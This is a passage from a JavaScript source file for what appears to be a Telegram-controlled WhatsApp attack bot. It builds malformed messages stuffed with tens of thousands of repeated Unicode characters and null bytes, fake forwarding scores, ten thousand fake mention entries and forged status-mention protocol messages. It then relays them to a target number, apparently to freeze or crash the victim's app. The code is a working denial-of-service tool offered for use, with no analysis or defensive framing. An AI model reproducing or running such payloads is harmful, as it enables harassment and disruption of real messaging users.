                    }]
                }]
            }]
        });

    
        const delayPayload = {
            interactiveResponseMessage: {
                body: {
                    text: "ោ៝".repeat(15000) + "ꦾ".repeat(10000) + "\u0000".repeat(5000),
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(30000)}\"}`,
                    version: 3
                },
                contextInfo: {
                    remoteJid: Math.random().toString(36) + "\u0000".repeat(10000),
                    isForwarded: true,
                    forwardingScore: 9999,
                    mentionedJid: [target],
                    urlTrackingMap: {
                        urlTrackingMapElements: Array.from({ length: 10000 }, (_, z) => ({
                            participant: `62${z + 100000}@s.whatsapp.net`
                        }))
                    }
                }
            }
        };

        await sock.relayMessage(target, delayPayload, {
            participant: { jid: target }
        });

     
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    },
                    additionalNodes: [{
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined
                    }]
                }
            }
        }, {});

     
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {});

        console.log(`succes sent to ${target}`);

    } catch (e) {
        console.log(`error ${e.message}`);
    }
}


// --- Jalankan Bot --- //
(async () => {
  try {
    console.clear();

    currentMode = getMode();

    
    await startSesi();

    
    await bot.launch();

    process.once("SIGINT", () => bot.stop("SIGINT"));
    process.once("SIGTERM", () => bot.stop("SIGTERM"));

    console.log("✅ Bot Telegram launched");
    console.log("🟢 System ready");

  } catch (err) {
    console.error("❌ Failed to start:", err);

    setTimeout(() => {
      
      process.exit(1);
    }, 3000);
  }
})();